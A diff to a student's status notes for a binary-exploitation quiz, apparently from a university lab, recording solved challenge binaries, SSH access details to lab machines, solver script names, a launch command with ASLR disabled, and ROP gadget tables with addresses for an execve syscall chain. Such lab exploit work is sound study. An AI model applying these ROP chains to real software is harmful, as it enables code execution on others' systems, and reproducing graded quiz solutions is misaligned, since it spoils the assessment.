@@ -1,4 +1,4 @@
-# Quiz 4 — Solve Status (COMPLETE for example sets)
+# Quiz 4 — Solve Status (COMPLETE: bin2 + g1 + bsa sets)
 
 ## Results
 
@@ -8,14 +8,16 @@
 | bin.2 | bin2 | ✅ SOLVED | uid=9992(apieri01) |
 | bin.1 | g1   | ✅ SOLVED | uid=9992(apieri01) |
 | bin.2 | g1   | ✅ SOLVED | uid=9992(apieri01) |
+| bin.1 | bsa  | ✅ SOLVED | uid=9992(apieri01) |
+| bin.2 | bsa  | ✅ SOLVED | uid=9992(apieri01) |
 
 ---
 
 ## Lab Connection
-- Machine: `10.16.13.89` (103ws14) — same key works for all 103wsX machines
-- SSH: `ssh -i C:\Users\andre\.ssh\lab_key -o StrictHostKeyChecking=no apieri01@10.16.13.89`
-- Binaries at: `~/quiz4_examples/bin2/` and `~/quiz4_examples/g1/`
-- Solver scripts at: `~/fix_g1.py`, `~/solve_final.sh`
+- Machine: `10.16.13.53` (103ws15) — same key works for all 103wsX machines
+- SSH: `ssh -i C:\Users\andre\.ssh\lab_key -o StrictHostKeyChecking=no apieri01@10.16.13.53`
+- Binaries at: `~/quiz4_examples/bin2/`, `~/quiz4_examples/g1/`, `~/bsa/`
+- Solver scripts at: `~/fix_g1.py`, `~/solve_final.sh`, `~/bsa/solve_bsa.py`
 
 ---
 
@@ -96,6 +98,20 @@ echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.X ./exploit.X
 | +0x0f | 31 d2 c3 | xor edx,edx; ret | 0x070493ef |
 | +0x12 | b0 0b c3 | mov al,0xb; ret | 0x070493f2 |
 | +0x15 | cd 80 c3 | int 0x80; ret | 0x070493f5 |
+
+### bsa/bin.1 AND bsa/bin.2 (OFFSET=48, gadget_base=0x070493e0) — IDENTICAL ORDER
+| Offset | Bytes | Gadget | Address |
+|--------|-------|--------|---------|
+| +0x00 | 31 c0 c3 | xor eax,eax; ret | 0x070493e0 |
+| +0x03 | 58 5b c3 | pop eax; pop ebx; ret | 0x070493e3 |
+| +0x06 | 89 03 c3 | mov [ebx],eax; ret | 0x070493e6 |
+| +0x09 | 31 c9 c3 | xor ecx,ecx; ret | 0x070493e9 |
+| +0x0c | 89 c3 c3 | mov ebx,eax; ret | 0x070493ec |
+| +0x0f | 31 d2 c3 | xor edx,edx; ret | 0x070493ef |
+| +0x12 | b0 0b c3 | mov al,0xb; ret | 0x070493f2 |
+| +0x15 | cd 80 c3 | int 0x80; ret | 0x070493f5 |
+> Note: movb table in main() writes bytes in order 58 5b c3 31 c0... but mmap offsets cause actual
+> gadgets to land with xor_eax first. Always trust GDB memory dump, not movb order.
 
 ### bin2/bin.2 (OFFSET=56, gadget_base=0x070493e0)
 | Offset | Bytes | Gadget | Address |
